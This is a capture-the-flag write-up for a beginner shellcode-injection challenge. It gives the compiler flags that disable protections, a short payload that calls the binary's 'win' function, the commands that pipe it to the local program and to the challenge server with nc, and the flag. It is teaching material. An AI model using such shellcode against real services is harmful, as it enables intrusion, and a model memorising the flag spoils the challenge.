# Injection
This challenges introduces basic shellcode injection to the player.
**Description of the Challenge:**
A friend handed me this <Link>.
He said I have to do a Injection or something like this,
but I don't know how! Can you help me!

Hint: google shellcode

## Setup
* The file `injection_socket.py` implements a socketlistener in python. It waits on userinput of the correspoding program and pipes it back to the output
* The following command is used to generate the binary without protection mechanisms:
```gcc binary.c -z execstack -z norelro -fno-stack-protector -D_FORTIFY_SOURCE=0 -ggdb -m32 -static -o binary_32```

## Solution
* First, you have to disassembly the binary and look for a function called "win"
```objdump -d binary | grep win```

* Next you have to pipe assembler code to the program itself (e. g. `win` at `0x08048885`)
* Dissassembly:
```
mov eax, 0x08048885
call eax
```

* As a result, the payload looks like: `\xB8\x85\x88\x04\x08\xFF\xD0`

* Shell:
```
$ python -c "print '\xB8\x85\x88\x04\x08\xFF\xD0'" | ./binary_32
$ python -c "print '\xB8\x85\x88\x04\x08\xFF\xD0'" | nc ctf-server port
```

## Flag
Flag: THICTF{FUNCTION_P0INTERS_4RE_SO_TR1CKY}